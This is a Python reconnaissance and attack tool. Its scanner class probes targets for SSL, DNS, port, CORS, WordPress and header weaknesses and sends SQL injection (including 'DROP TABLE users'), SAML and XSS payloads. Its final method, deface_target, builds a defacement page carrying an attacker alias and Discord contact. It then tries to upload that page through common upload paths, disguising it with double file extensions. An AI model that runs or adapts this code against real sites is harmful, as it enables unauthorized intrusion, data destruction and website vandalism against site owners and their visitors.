import requests
import socket
import dns.resolver
import whois
import ssl
import OpenSSL
import subprocess
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urljoin
import re
import os
import json
from typing import Dict, Any

class AdvancedScanner:
    def __init__(self):
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close'
        }

    def check_ssl_vulnerabilities(self, domain):
        vulnerabilities = []
        try:
            cert = ssl.get_server_certificate((domain, 443))
            x509 = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, cert)
            
            # Check certificate expiration
            if x509.has_expired():
                vulnerabilities.append("SSL Certificate has expired")
            
            # Check weak signature algorithms
            sig_alg = x509.get_signature_algorithm().decode()
            weak_algs = ['md5', 'sha1']
            if any(alg in sig_alg.lower() for alg in weak_algs):
                vulnerabilities.append(f"Weak signature algorithm: {sig_alg}")
            
            # Check key strength
            key = x509.get_pubkey()
            key_length = key.bits()
            if key_length < 2048:
                vulnerabilities.append(f"Weak key length: {key_length} bits")
                
        except Exception as e:
            vulnerabilities.append(f"SSL Error: {str(e)}")
        
        return vulnerabilities

    def subdomain_enumeration(self, domain):
        subdomains = set()
        
        # DNS enumeration
        record_types = ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT']
        for record in record_types:
            try:
                answers = dns.resolver.resolve(domain, record)
                for rdata in answers:
                    subdomains.add(str(rdata))
            except:
                continue

        # Certificate transparency
        try:
            ct_url = f"https://crt.sh/?q=%.{domain}&output=json"
            response = requests.get(ct_url)
            if response.status_code == 200:
                data = response.json()
                for entry in data:
                    name = entry.get('name_value', '')
                    if name:
                        subdomains.add(name)
        except:
            pass

        return list(subdomains)

    def check_waf_presence(self, url):
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare'],
            'AWS WAF': ['x-amzn-waf', 'aws-waf'],
            'Akamai': ['akamai-guardian'],
            'Imperva': ['incapsula'],
            'F5 BIG-IP': ['big-ip', 'f5'],
            'Sucuri': ['sucuri'],
        }
        
        detected_wafs = []
        try:
            response = requests.get(url, headers=self.headers)
            headers_str = str(response.headers).lower()
            
            for waf, signatures in waf_signatures.items():
                if any(sig.lower() in headers_str for sig in signatures):
                    detected_wafs.append(waf)
                    
        except Exception as e:
            return [f"Error checking WAF: {str(e)}"]
            
        return detected_wafs if detected_wafs else ["No WAF detected"]

    def check_misconfigurations(self, url):
        issues = []
        common_files = [
            '.git/config',
            '.env',
            'wp-config.php.bak',
            'config.php.bak',
            '.htaccess.bak',
            'robots.txt',
            'sitemap.xml',
            '.svn/entries',
            'backup/',
            'phpinfo.php'
        ]
        
        for file in common_files:
            try:
                test_url = urljoin(url, file)
                response = requests.get(test_url, headers=self.headers, timeout=5)
                if response.status_code == 200:
                    issues.append(f"Potentially sensitive file exposed: {test_url}")
            except:
                continue

        return issues

    def check_open_ports_advanced(self, host):
        interesting_ports = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            443: "HTTPS",
            445: "SMB",
            1433: "MSSQL",
            1521: "Oracle",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            6379: "Redis",
            8080: "HTTP-Proxy",
            27017: "MongoDB"
        }
        
        results = []
        
        def check_port(port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                # Try to get service banner
                try:
                    service_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    service_socket.settimeout(2)
                    service_socket.connect((host, port))
                    banner = service_socket.recv(1024).decode('utf-8', errors='ignore')
                    service_socket.close()
                    return port, interesting_ports.get(port, "Unknown"), banner.strip()
                except:
                    return port, interesting_ports.get(port, "Unknown"), "No banner"
            return None

        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(check_port, port) for port in interesting_ports.keys()]
            for future in futures:
                result = future.result()
                if result:
                    results.append(result)

        return results

    def check_dns_zone_transfer(self, domain):
        vulnerabilities = []
        try:
            ns_records = dns.resolver.resolve(domain, 'NS')
            for ns in ns_records:
                nameserver = str(ns)
                try:
                    zone = dns.zone.from_xfr(dns.query.xfr(nameserver, domain))
                    vulnerabilities.append(f"Zone transfer possible from {nameserver}")
                    for name, node in zone.nodes.items():
                        vulnerabilities.append(f"Record: {name}")
                except:
                    continue
        except Exception as e:
            vulnerabilities.append(f"Error checking zone transfer: {str(e)}")
        
        return vulnerabilities

    def check_email_spoofing(self, domain):
        spf_issues = []
        dmarc_issues = []
        
        # Check SPF
        try:
            spf_records = dns.resolver.resolve(domain, 'TXT')
            has_spf = False
            for record in spf_records:
                if 'v=spf1' in str(record):
                    has_spf = True
                    if '~all' in str(record) or '?all' in str(record):
                        spf_issues.append("Weak SPF configuration (soft fail)")
                    elif '-all' not in str(record):
                        spf_issues.append("Missing strict SPF policy (-all)")
            
            if not has_spf:
                spf_issues.append("No SPF record found")
        except:
            spf_issues.append("Error checking SPF records")

        # Check DMARC
        try:
            dmarc_records = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
            has_dmarc = False
            for record in dmarc_records:
                if 'v=DMARC1' in str(record):
                    has_dmarc = True
                    if 'p=none' in str(record):
                        dmarc_issues.append("DMARC policy set to none")
                    if 'pct=100' not in str(record):
                        dmarc_issues.append("DMARC not applied to all emails")
            
            if not has_dmarc:
                dmarc_issues.append("No DMARC record found")
        except:
            dmarc_issues.append("Error checking DMARC records")

        return {
            'spf_issues': spf_issues,
            'dmarc_issues': dmarc_issues
        }

    def check_clickjacking(self, url):
        try:
            response = requests.get(url, headers=self.headers)
            headers = response.headers
            
            issues = []
            if 'X-Frame-Options' not in headers:
                issues.append("Missing X-Frame-Options header - Clickjacking possible")
            elif headers['X-Frame-Options'].lower() not in ['deny', 'sameorigin']:
                issues.append(f"Weak X-Frame-Options policy: {headers['X-Frame-Options']}")
                
            if 'Content-Security-Policy' in headers:
                csp = headers['Content-Security-Policy']
                if 'frame-ancestors' not in csp:
                    issues.append("CSP missing frame-ancestors directive")
            
            return issues
        except:
            return ["Error checking clickjacking protections"]

    def check_http_methods(self, url):
        dangerous_methods = ['PUT', 'DELETE', 'TRACE', 'OPTIONS', 'CONNECT']
        findings = []
        
        for method in dangerous_methods:
            try:
                response = requests.request(method, url, headers=self.headers, timeout=5)
                if response.status_code != 405:  # Method Not Allowed
                    findings.append(f"Potentially dangerous HTTP method enabled: {method} ({response.status_code})")
            except:
                continue
                
        return findings

    def check_information_disclosure(self, url):
        patterns = {
            'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'phone': r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
            'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
            'api_key': r'[a-zA-Z0-9_-]*key[a-zA-Z0-9_-]*',
            'aws_key': r'AKIA[0-9A-Z]{16}',
            'github_token': r'github[_\-\s]*token[_\-\s]*[\'"\`]:?[_\-\s]*[a-zA-Z0-9_-]+',
        }
        
        findings = []
        try:
            response = requests.get(url, headers=self.headers)
            content = response.text
            
            for info_type, pattern in patterns.items():
                matches = re.finditer(pattern, content, re.IGNORECASE)
                for match in matches:
                    findings.append(f"Possible {info_type} disclosure: {match.group()}")
        except:
            pass
            
        return findings

    def check_wordpress_vulnerabilities(self, url):
        wp_paths = [
            '/wp-admin/',
            '/wp-content/',
            '/wp-includes/',
            '/wp-json/',
            '/wp-login.php',
            '/xmlrpc.php'
        ]
        
        findings = []
        version_pattern = r'<meta name="generator" content="WordPress ([0-9.]+)"'
        
        try:
            response = requests.get(url, headers=self.headers)
            
            # Check WordPress version
            version_match = re.search(version_pattern, response.text)
            if version_match:
                findings.append(f"WordPress version detected: {version_match.group(1)}")
            
            # Check sensitive paths
            for path in wp_paths:
                try:
                    test_url = urljoin(url, path)
                    path_response = requests.get(test_url, headers=self.headers)
                    if path_response.status_code == 200:
                        findings.append(f"WordPress path accessible: {test_url}")
                except:
                    continue
                    
        except:
            pass
            
        return findings

    def check_cors_misconfig_advanced(self, url):
        test_origins = [
            'https://evil.com',
            'null',
            'https://attacker.com',
            f'https://{urlparse(url).netloc}.evil.com',
            'https://evil.{}'.format(urlparse(url).netloc),
        ]
        
        findings = []
        for origin in test_origins:
            try:
                headers = self.headers.copy()
                headers['Origin'] = origin
                response = requests.get(url, headers=headers)
                
                acao = response.headers.get('Access-Control-Allow-Origin')
                acac = response.headers.get('Access-Control-Allow-Credentials')
                
                if acao:
                    if acao == '*' and acac == 'true':
                        findings.append(f"Critical CORS misconfiguration: Wildcard origin with credentials")
                    elif acao == origin:
                        findings.append(f"CORS configured to trust {origin}")
                    elif acao == 'null':
                        findings.append("CORS allows null origin")
                        
            except:
                continue
                
        return findings

    def check_file_upload_vulnerabilities(self, url):
        test_files = {
            'test.php': 'application/x-php',
            'test.php.jpg': 'image/jpeg',
            'test.aspx': 'application/x-aspx',
            'test.jsp': 'application/x-jsp',
            'test.html': 'text/html',
        }
        
        findings = []
        for filename, content_type in test_files.items():
            try:
                headers = self.headers.copy()
                headers['Content-Type'] = content_type
                
                files = {
                    'file': (filename, 'Test content', content_type)
                }
                
                response = requests.post(url, files=files, headers=headers)
                
                if response.status_code in [200, 201]:
                    findings.append(f"Possible file upload vulnerability: {filename} ({content_type})")
                    
            except:
                continue
                
        return findings

    def find_real_ip(self, url: str) -> str:
        """Find the real IP address of a given URL."""
        try:
            hostname = url.split("//")[-1].split("/")[0]
            ip_address = socket.gethostbyname(hostname)
            return ip_address
        except Exception as e:
            return f"Error resolving IP: {str(e)}"

    def check_sql_injection(self, url: str) -> Dict[str, Any]:
        """Check for SQL Injection vulnerabilities."""
        payloads = [
            "' OR '1'='1' --",
            "' UNION SELECT NULL --",
            "'; DROP TABLE users; --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='password') --"
        ]
        results = []
        for payload in payloads:
            response = requests.get(f"{url}{payload}")
            if "SQL" in response.text or "error" in response.text:
                results.append({"payload": payload, "vulnerable": True})
        return results

    def check_saml_injection(self, url: str) -> Dict[str, Any]:
        """Check for SAML Injection vulnerabilities."""
        payloads = [
            "<saml:Assertion xmlns:saml='urn:oasis:names:tc:SAML:2.0:assertion'>",
            "<saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject>",
            "<saml:Attribute Name='user' Format='urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified'>",
        ]
        results = []
        for payload in payloads:
            response = requests.post(url, data=payload)
            if "SAML" in response.text:
                results.append({"payload": payload, "vulnerable": True})
        return results

    def check_xss_injection(self, url: str) -> Dict[str, Any]:
        """Check for XSS vulnerabilities."""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
        ]
        results = []
        for payload in payloads:
            response = requests.get(f"{url}{payload}")
            if payload in response.text:
                results.append({"payload": payload, "vulnerable": True})
        return results

    def check_ssrf_vulnerabilities(self, url: str) -> Dict[str, Any]:
        """Check for SSRF vulnerabilities."""
        # Implement SSRF checking logic here
        pass

    def check_xxe_vulnerabilities(self, url: str) -> Dict[str, Any]:
        """Check for XXE vulnerabilities."""
        # Implement XXE checking logic here
        pass

    def check_rce_vulnerabilities(self, url: str) -> Dict[str, Any]:
        """Check for RCE vulnerabilities."""
        # Implement RCE checking logic here
        pass

    def check_file_upload_bypass(self, url: str) -> Dict[str, Any]:
        """Check for file upload bypass vulnerabilities."""
        # Implement file upload bypass checking logic here
        pass

    def check_oauth_vulnerabilities(self, url: str) -> Dict[str, Any]:
        """Check for OAuth vulnerabilities."""
        # Implement OAuth checking logic here
        pass

    def deface_target(self, url: str) -> Dict[str, Any]:
        """Attempt to deface the target by uploading a defacement page."""
        attacker_name = "𝓚𝓲𝓵𝔃𝓪-𝓗𝓲𝓭𝓭𝓮𝓷-𝓑𝓪𝓼𝓮👑"
        description = "This site has been defaced. If you want to talk to the owner, contact the owner on Discord: alialmoed12123."
        
        # Create the defacement HTML content with more styling and effects
        deface_content = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Site Defaced</title>
            <style>
                body {{
                    background-color: #000;
                    margin: 0;
                    padding: 0;
                    display: flex;
                    flex-direction: column;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    font-family: 'Arial', sans-serif;
                    color: #ff0000;
                    text-shadow: 0 0 10px #ff0000;
                    overflow: hidden;
                }}
                
                .glitch {{
                    font-size: 50px;
                    font-weight: bold;
                    text-transform: uppercase;
                    position: relative;
                    text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff,
                                0.025em 0.04em 0 #fffc00;
                    animation: glitch 725ms infinite;
                }}
                
                .text {{
                    font-size: 24px;
                    margin: 20px;
                    text-align: center;
                    animation: pulse 2s infinite;
                }}
                
                .contact {{
                    font-size: 18px;
                    color: #fff;
                    margin-top: 20px;
                }}
                
                @keyframes glitch {{
                    0% {{
                        text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff,
                                    0.025em 0.04em 0 #fffc00;
                    }}
                    15% {{
                        text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff,
                                    0.025em 0.04em 0 #fffc00;
                    }}
                    16% {{
                        text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff,
                                    -0.05em -0.05em 0 #fffc00;
                    }}
                    49% {{
                        text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff,
                                    -0.05em -0.05em 0 #fffc00;
                    }}
                    50% {{
                        text-shadow: 0.05em 0.035em 0 #00fffc, 0.03em 0 0 #fc00ff,
                                    0 -0.04em 0 #fffc00;
                    }}
                    99% {{
                        text-shadow: 0.05em 0.035em 0 #00fffc, 0.03em 0 0 #fc00ff,
                                    0 -0.04em 0 #fffc00;
                    }}
                    100% {{
                        text-shadow: -0.05em 0 0 #00fffc, -0.025em -0.04em 0 #fc00ff,
                                    -0.04em -0.025em 0 #fffc00;
                    }}
                }}
                
                @keyframes pulse {{
                    0% {{ opacity: 1; }}
                    50% {{ opacity: 0.5; }}
                    100% {{ opacity: 1; }}
                }}
            </style>
        </head>
        <body>
            <div class="glitch">{attacker_name}</div>
            <div class="text">{description}</div>
            <div class="contact">
                Discord: alialmoed12123<br>
                <a href="https://discord.gg/8VZUXKyy" style="color: #00ff00; text-decoration: none;">
                    Join our Discord
                </a>
            </div>
            <script>
                // Add some dynamic effects
                document.addEventListener('mousemove', (e) => {{
                    const x = e.clientX / window.innerWidth;
                    const y = e.clientY / window.innerHeight;
                    document.body.style.background = `radial-gradient(circle at ${{x*100}}% ${{y*100}}%, #300 0%, #000 50%)`;
                }});
            </script>
        </body>
        </html>
        """

        # Try multiple upload methods
        upload_paths = [
            '/upload.php',
            '/upload',
            '/fileupload',
            '/assets/upload',
            '/images/upload',
            '/upload/image',
            '/api/upload'
        ]

        for path in upload_paths:
            try:
                full_url = urljoin(url, path)
                
                # Try different upload techniques
                files = {
                    'file': ('index.html', deface_content, 'text/html'),
                    'image': ('defaced.php.jpg', deface_content, 'image/jpeg'),
                    'document': ('page.php.pdf', deface_content, 'application/pdf')
                }

                for file_key, (filename, content, content_type) in files.items():
                    try:
                        response = requests.post(
                            full_url, 
                            files={file_key: (filename, content, content_type)},
                            timeout=10
                        )
                        
                        if response.status_code in [200, 201]:
                            return {
                                "success": True, 
                                "message": f"Defacement successful via {path}",
                                "method": f"Upload as {content_type}"
                            }
                    except:
                        continue

            except Exception as e:
                continue

        return {"success": False, "message": "All defacement attempts failed"} 